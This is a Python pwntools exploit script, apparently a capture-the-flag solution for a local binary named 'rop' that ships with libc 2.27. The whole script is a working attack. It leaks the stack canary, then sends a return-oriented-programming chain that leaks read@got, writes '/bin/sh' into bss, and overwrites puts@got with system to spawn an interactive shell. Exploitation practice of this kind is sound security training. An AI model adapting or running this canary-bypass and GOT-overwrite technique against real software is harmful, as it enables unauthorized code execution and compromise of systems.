from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))


context.log_level = 'debug'

p = process("./rop")
e = ELF("./rop")
libc = ELF("./libc-2.27.so")
r = ROP(e)

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
gdb.attach(p)

# Canary Leak
payload = b'A' * 57
p.recvuntil("[1] Leak Canary")
p.sendafter("Buf: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00'+p.recvn(7))

slog("Canary", canary)


puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
read_got = e.got['read']
bss = e.bss()

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]


payload = b'A'*56 + p64(canary) + b'A'*8

# puts(read@got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)


# read(0, bss, 8)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(8)
payload += p64(read_plt)


# read(0, puts@got, 8)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(puts_got) + p64(8)
payload += p64(read_plt)


# puts(bss) => system("/bin/sh")
payload += p64(ret)
payload += p64(pop_rdi) + p64(bss)
payload += p64(puts_plt)

pause()
p.recvuntil("[2] Input ROP payload")
p.sendlineafter("Buf: ", payload)


read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset

slog("libc base", lb)
slog("read", read)
slog("system", system)


p.send(b"/bin/sh\x00")
p.send(p64(system))

p.interactive()

